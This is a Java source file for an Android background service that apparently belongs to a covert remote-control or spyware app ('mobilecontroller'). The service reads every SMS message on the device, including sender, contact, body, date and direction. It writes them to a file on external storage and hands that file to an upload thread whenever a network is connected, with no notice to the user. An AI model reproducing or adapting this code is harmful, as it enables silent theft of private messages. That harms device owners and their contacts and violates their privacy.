package services;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.nio.charset.Charset;
import java.text.SimpleDateFormat;
import java.util.Date;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

import com.system.mobilecontroller.UploadThread;

public class UploadsmsService extends Service{
	Context context = UploadsmsService.this;
	String sdPath =Environment.getExternalStorageDirectory().getPath() + "/" ;
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
		
	}

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		
		String got = getSmsInPhone();
		try 
		{	
			FileOutputStream fos = new FileOutputStream(sdPath + "Android/SMS.txt");
			OutputStream os = fos ; 
			OutputStreamWriter osw = new OutputStreamWriter(fos , Charset.forName("Unicode"));
			osw.write(got);
			osw.flush();
			
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		if (NetworkConnected()) { 
		new Handler().postDelayed(new Runnable()
		{
			public void run()
			{
				UploadThread ut = new UploadThread();
				ut.setTar("SMS.txt");
				Thread t = new Thread(ut);
				t.start();
			}
		},2000);
		}
		else
		{
			SharedPreferences sp = context.getSharedPreferences("SP",
					MODE_PRIVATE);
			Editor editor = sp.edit();
			editor.putBoolean("smsUploaded", false);
			editor.commit();
			
		}
//		Toast.makeText(UploadsmsService.this, "OK", Toast.LENGTH_LONG).show();
		return super.onStartCommand(intent, flags, startId);
	}

	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		super.onDestroy();
	}
	
	
	public String getSmsInPhone()   
	{   
	    final String SMS_URI_ALL   = "content://sms/";     
//	    final String SMS_URI_INBOX = "content://sms/inbox";   
//	    final String SMS_URI_SEND  = "content://sms/sent";   
//	    final String SMS_URI_DRAFT = "content://sms/draft";   
	       
	    StringBuilder smsBuilder = new StringBuilder();   
	       
	    try{   
	        ContentResolver cr = getContentResolver();   
	        String[] projection = new String[]{"_id", "address", "person",    
	                "body", "date", "type"};   
	        Uri uri = Uri.parse(SMS_URI_ALL);   
	        Cursor cur = cr.query(uri, projection, null, null, "date desc");   
	        
	        if (cur.moveToFirst()) {   
	            String name;    
	            String phoneNumber;          
	            String smsbody;   
	            String date;   
	            String type;   
	            
	            int nameColumn = cur.getColumnIndex("person");   
	            int phoneNumberColumn = cur.getColumnIndex("address");   
	            int smsbodyColumn = cur.getColumnIndex("body");   
	            int dateColumn = cur.getColumnIndex("date");   
	            int typeColumn = cur.getColumnIndex("type");   
	            
	            do{   
	                name = cur.getString(nameColumn);                
	                phoneNumber = cur.getString(phoneNumberColumn);   
	                smsbody = cur.getString(smsbodyColumn);   
	                   
	                SimpleDateFormat dateFormat = new SimpleDateFormat(   
	                        "yyyy-MM-dd hh:mm:ss");   
	                Date d = new Date(Long.parseLong(cur.getString(dateColumn)));   
	                date = dateFormat.format(d);//转换成规定的格式   
	                   
	                int typeId = cur.getInt(typeColumn);   
	                if(typeId == 1){   
	                    type = "接收";   
	                } else if(typeId == 2){   
	                    type = "发送";   
	                } else {   
	                    type = "";   
	                }   
	                
	                smsBuilder.append("[");   
	                smsBuilder.append(name+",");   
	                smsBuilder.append(phoneNumber+",");   
	                smsBuilder.append(smsbody+",");   
	                smsBuilder.append(date+",");   
	                smsBuilder.append(type);   
	                smsBuilder.append("]" + "\r\n");   
	                
	                if(smsbody == null) smsbody = "";     
	            }while(cur.moveToNext());   //不停地aqppend，然后data DES排序，得到一个 非常长 的 String
	        } else {   
	            smsBuilder.append("no result!");   
	        }   
	            
	        smsBuilder.append("THAT'S ALL.");   
	    } catch(SQLiteException ex) {   
	        Log.d("SQLiteException in getSmsInPhone", ex.getMessage());   
	    }   
	    return smsBuilder.toString();   
	} 
	/**
	 * 对网络连接状态进行判断
	 * @return  true, 可用； false， 不可用
	 */
	private boolean NetworkConnected() {
		ConnectivityManager connManager = (ConnectivityManager)getSystemService(Context.CONNECTIVITY_SERVICE);
		if(connManager.getActiveNetworkInfo() != null) {
			return connManager.getActiveNetworkInfo().isConnected();
		}
		return false;
	}
}
